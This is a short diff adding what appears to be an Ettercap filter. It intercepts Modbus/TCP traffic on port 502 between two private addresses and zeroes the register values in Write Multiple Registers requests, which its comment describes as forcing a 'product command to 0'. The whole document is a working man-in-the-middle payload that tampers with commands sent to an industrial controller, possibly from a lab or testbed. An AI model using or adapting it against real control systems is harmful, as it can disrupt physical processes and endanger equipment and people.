@@ -1,0 +1,8 @@
+# manipulate product command to 0
+
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.13') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0x00;
+        DATA.data + 14 = 0x00;
+    }
+}
